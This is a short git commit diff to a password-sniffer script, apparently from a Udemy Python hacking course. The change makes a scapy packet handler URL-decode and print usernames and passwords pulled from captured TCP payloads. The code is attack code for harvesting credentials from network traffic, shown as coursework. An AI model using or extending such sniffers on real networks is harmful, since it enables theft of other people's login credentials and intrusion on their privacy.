38012ef3afa55a039db5faf3205792108df40313
albert18 <erertech@gmail.com>
2022-12-19 20:29:59 +0300

    update

--- 4. Udemy/1. Python 3 Hacking/5. Password Sniffer/pass-sniffer.py
+++ 4. Udemy/1. Python 3 Hacking/5. Password Sniffer/pass-sniffer.py
@@ -34,7 +34,12 @@ def get_login_pass(body):
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
         body = str(packet[TCP].payload)
-        username, password = get_login_pass(body)
+        user_pass = get_login_pass(body)
+        if user_pass != None:
+            print(parse.unquote(user_pass[0]))
+            print(parse.unquote(user_pass[1]))
+    else:
+        pass
         
 try:
     sniff(iface=iface, prn=pkt_parser, store=0)
